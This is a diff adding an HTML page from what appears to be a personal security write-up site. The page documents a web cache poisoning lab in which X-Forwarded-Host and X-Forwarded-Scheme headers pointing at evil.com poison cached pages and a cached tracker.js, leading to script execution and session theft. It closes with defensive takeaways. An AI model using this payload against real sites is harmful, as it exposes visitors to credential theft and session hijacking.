@@ -1,0 +1,137 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+	<meta charset="utf-8" />
+	<link rel="icon" href="../favicon.png" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	
+		<link href="../_app/immutable/assets/0.DuirhDqL.css" rel="stylesheet">
+		<link rel="modulepreload" href="../_app/immutable/entry/start.CwlG-iLQ.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/CrCi_thf.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/BUl9RxAW.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/AGwufyzN.js">
+		<link rel="modulepreload" href="../_app/immutable/entry/app.7N_XEpmJ.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/CCmE3BsN.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/BI7ncmrh.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/BSdgaQjA.js">
+		<link rel="modulepreload" href="../_app/immutable/nodes/0.lE3F9uS1.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/YKOfnEHP.js">
+		<link rel="modulepreload" href="../_app/immutable/nodes/3.Bza5gJ1m.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/DIXbH3Jv.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/DmywiMXO.js">
+	<!-- Google tag (gtag.js) -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=G-R1TYCEZF9Y"></script>
+	<script>
+		window.dataLayer = window.dataLayer || [];
+		function gtag() {dataLayer.push(arguments);}
+		gtag('js', new Date());
+
+		gtag('config', 'G-R1TYCEZF9Y');
+	</script>
+
+</head>
+
+<body data-sveltekit-preload-data="hover">
+	<div style="display: contents"><!--[--><!--[--><!----><!----><!----><header class="sticky top-0 left-0 right-0 z-50 max-h-80 h-20 bg-white shadow-md flex justify-center items-center w-full"><nav class="container mx-auto flex justify-between items-center" aria-label="Main navigation"><div class="mx-6 flex gap-5 items-center cursor-pointer"><img src="/_app/immutable/assets/avatar.BpAltn8f.png" alt="Logo" class="h-12 w-12 rounded-lg"/> <h1 class="text-2xl font-bold uppercase sm:block hidden">Boxgramer</h1></div> <!--[--><h1 class="text-md font-bold uppercase block p-2"> Web Cache Poisoning with multiple headers</h1><!--]--> <!--[--><div class="flex justify-center items-center gap-4"><!--[--><a href="/writeups/web-shell-upload-obfuscated-file-extension" class="text-gray-600 hover:text-gray-900 transition duration-200"><svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24px" height="24px"><!--[--><path stroke-linecap="round" stroke-linejoin="round" d="M10.5 19.5 3 12m0 0 7.5-7.5M3 12h18"></path><!--]--></svg><!----></a><!--]--> <!--[--><a href="/writeups/targeted-web-cache-poisoning-unknown-header" class="text-gray-600 hover:text-gray-900 transition duration-200"><svg fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24px" height="24px"><!--[--><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 4.5 21 12m0 0-7.5 7.5M21 12H3"></path><!--]--></svg><!----></a><!--]--></div><!--]--></nav></header><!----> <main class="container mx-auto max-w-6xl px-6 py-12"><div class="content"><!----><h1>Note(Datetime, Name) : 2025-04-25 Web Cache Poisoning with multiple headers</h1>
+<h3>Metodelogy</h3>
+<ol>
+<li>Investigate the system to retrieve a list of features</li>
+<li>Discribe the feature and explain how it works</li>
+<li>List possible vulnerabilities and group by feature</li>
+<li>Proof of concept for possible vulnerabilities</li>
+<li>What is the impact of the vulnerabilities after the proof of concept ?</li>
+</ol>
+<h1>==========================================================================================================</h1>
+<blockquote>
+</blockquote>
+<h2>feature:</h2>
+<ol>
+<li>/ -&gt;  got response -&gt; indicated page is cache<pre><code>
+</code></pre>
+</li>
+</ol>
+<p>HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Set-Cookie: session=aRRl8oPADEsf9eyGaK69gY43XSY30squ; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+Connection: close
+Content-Length: 10914</p>
+<pre><code>```
+</code></pre>
+<h3>steps taken:</h3>
+<ol>
+<li>X-Forwarded-Host: evil.com -&gt; normal response</li>
+<li>X-Forwarded-Scheme: http -&gt; server redirected to the https version of the website</li>
+<li>use this payload -&gt; page is redirected to the evil.com and website is cached by server</li>
+</ol>
+<pre><code>X-Forwarded-Host: evil.com
+X-Forwarded-Scheme: http
+</code></pre>
+<h2>vulnerabilities :</h2>
+<ol>
+<li>web cache poisioning by use header</li>
+</ol>
+<pre><code>X-Forwarded-Host: evil.com
+X-Forwarded-Scheme: http
+</code></pre>
+<h2>Proof of concept:</h2>
+<ol>
+<li>send payload to / -&gt; and got redirected to evil.com -&gt;  cached</li>
+</ol>
+<pre><code>X-Forwarded-Host: evil.com
+X-Forwarded-Scheme: http
+</code></pre>
+<ol start="2">
+<li>Locate the file /resource/tracker.js and confirm that it is cacheable.</li>
+<li>Apply this payload and send a request to <targetdomain>/resource/tracker.js. Make sure the tracker.js file is cached by the server:</li>
+</ol>
+<pre><code>X-Forwarded-Host: &lt;yourdomain&gt;
+X-Forwarded-Scheme: http
+</code></pre>
+<ol start="4">
+<li>after the response is cached , any page that includes tracker.js will fetch it from <yourdomain>/resource/tracker.js due to the redirect.</li>
+</ol>
+<h2>impact</h2>
+<p>1.An attacker can poison the cache and cause browsers to load a malicious tracker.js file.</p>
+<p>2.This can lead to the execution of arbitrary JavaScript on victim pages, resulting in:</p>
+<pre><code>- Stolen credentials
+
+- Session hijacking
+
+- Full client-side takeover (depending on script capabilities)
+</code></pre>
+<h2>takeaways</h2>
+<p>1.Always validate and sanitize any input headers, especially X-Forwarded-*.</p>
+<p>2.Ensure cache keys include all relevant headers to prevent cache poisoning.</p>
+<p>3.Avoid caching responses that include user-controllable input (even in headers).</p>
+<!----></div></main> <footer class="bg-gray-50 border-t border-gray-200 py-6"><div class="container mx-auto max-w-6xl px-6 flex flex-col md:flex-row justify-center items-center space-y-4 md:space-y-0"><p class="text-sm text-gray-600">© 2023 Boxgramer. All rights reserved.</p> <!--[!--><!--]--></div></footer><!----><!----><!----><!----><!--]--> <!--[!--><!--]--><!--]-->
+			
+			<script>
+				{
+					__sveltekit_qchkt = {
+						base: new URL("..", location).pathname.slice(0, -1)
+					};
+
+					const element = document.currentScript.parentElement;
+
+					Promise.all([
+						import("../_app/immutable/entry/start.CwlG-iLQ.js"),
+						import("../_app/immutable/entry/app.7N_XEpmJ.js")
+					]).then(([kit, app]) => {
+						kit.start(app, element, {
+							node_ids: [0, 3],
+							data: [null,{type:"data",data:{html:"\u003Ch1>Note(Datetime, Name) : 2025-04-25 Web Cache Poisoning with multiple headers\u003C/h1>\n\u003Ch3>Metodelogy\u003C/h3>\n\u003Col>\n\u003Cli>Investigate the system to retrieve a list of features\u003C/li>\n\u003Cli>Discribe the feature and explain how it works\u003C/li>\n\u003Cli>List possible vulnerabilities and group by feature\u003C/li>\n\u003Cli>Proof of concept for possible vulnerabilities\u003C/li>\n\u003Cli>What is the impact of the vulnerabilities after the proof of concept ?\u003C/li>\n\u003C/ol>\n\u003Ch1>==========================================================================================================\u003C/h1>\n\u003Cblockquote>\n\u003C/blockquote>\n\u003Ch2>feature:\u003C/h2>\n\u003Col>\n\u003Cli>/ -&gt;  got response -&gt; indicated page is cache\u003Cpre>\u003Ccode>\n\u003C/code>\u003C/pre>\n\u003C/li>\n\u003C/ol>\n\u003Cp>HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nSet-Cookie: session=aRRl8oPADEsf9eyGaK69gY43XSY30squ; Secure; HttpOnly; SameSite=None\nX-Frame-Options: SAMEORIGIN\nCache-Control: max-age=30\nAge: 0\nX-Cache: miss\nConnection: close\nContent-Length: 10914\u003C/p>\n\u003Cpre>\u003Ccode>```\n\u003C/code>\u003C/pre>\n\u003Ch3>steps taken:\u003C/h3>\n\u003Col>\n\u003Cli>X-Forwarded-Host: evil.com -&gt; normal response\u003C/li>\n\u003Cli>X-Forwarded-Scheme: http -&gt; server redirected to the https version of the website\u003C/li>\n\u003Cli>use this payload -&gt; page is redirected to the evil.com and website is cached by server\u003C/li>\n\u003C/ol>\n\u003Cpre>\u003Ccode>X-Forwarded-Host: evil.com\nX-Forwarded-Scheme: http\n\u003C/code>\u003C/pre>\n\u003Ch2>vulnerabilities :\u003C/h2>\n\u003Col>\n\u003Cli>web cache poisioning by use header\u003C/li>\n\u003C/ol>\n\u003Cpre>\u003Ccode>X-Forwarded-Host: evil.com\nX-Forwarded-Scheme: http\n\u003C/code>\u003C/pre>\n\u003Ch2>Proof of concept:\u003C/h2>\n\u003Col>\n\u003Cli>send payload to / -&gt; and got redirected to evil.com -&gt;  cached\u003C/li>\n\u003C/ol>\n\u003Cpre>\u003Ccode>X-Forwarded-Host: evil.com\nX-Forwarded-Scheme: http\n\u003C/code>\u003C/pre>\n\u003Col start=\"2\">\n\u003Cli>Locate the file /resource/tracker.js and confirm that it is cacheable.\u003C/li>\n\u003Cli>Apply this payload and send a request to \u003Ctargetdomain>/resource/tracker.js. Make sure the tracker.js file is cached by the server:\u003C/li>\n\u003C/ol>\n\u003Cpre>\u003Ccode>X-Forwarded-Host: &lt;yourdomain&gt;\nX-Forwarded-Scheme: http\n\u003C/code>\u003C/pre>\n\u003Col start=\"4\">\n\u003Cli>after the response is cached , any page that includes tracker.js will fetch it from \u003Cyourdomain>/resource/tracker.js due to the redirect.\u003C/li>\n\u003C/ol>\n\u003Ch2>impact\u003C/h2>\n\u003Cp>1.An attacker can poison the cache and cause browsers to load a malicious tracker.js file.\u003C/p>\n\u003Cp>2.This can lead to the execution of arbitrary JavaScript on victim pages, resulting in:\u003C/p>\n\u003Cpre>\u003Ccode>- Stolen credentials\n\n- Session hijacking\n\n- Full client-side takeover (depending on script capabilities)\n\u003C/code>\u003C/pre>\n\u003Ch2>takeaways\u003C/h2>\n\u003Cp>1.Always validate and sanitize any input headers, especially X-Forwarded-*.\u003C/p>\n\u003Cp>2.Ensure cache keys include all relevant headers to prevent cache poisoning.\u003C/p>\n\u003Cp>3.Avoid caching responses that include user-controllable input (even in headers).\u003C/p>\n",slug:"web-cache-poisoning-multiple-headers",title:" Web Cache Poisoning with multiple headers",date:"2025-04-25",summary:"Web cache poisoning via X-Forwarded headers enables injecting malicious scripts by poisoning cached responses, risking credential theft and session hijacking.",url:"/writeups/web-cache-poisoning-multiple-headers",nextUrl:"/writeups/targeted-web-cache-poisoning-unknown-header",prevUrl:"/writeups/web-shell-upload-obfuscated-file-extension"},uses:{params:["slug"]}}],
+							form: null,
+							error: null
+						});
+					});
+				}
+			</script>
+		</div>
+</body>
+
+</html>
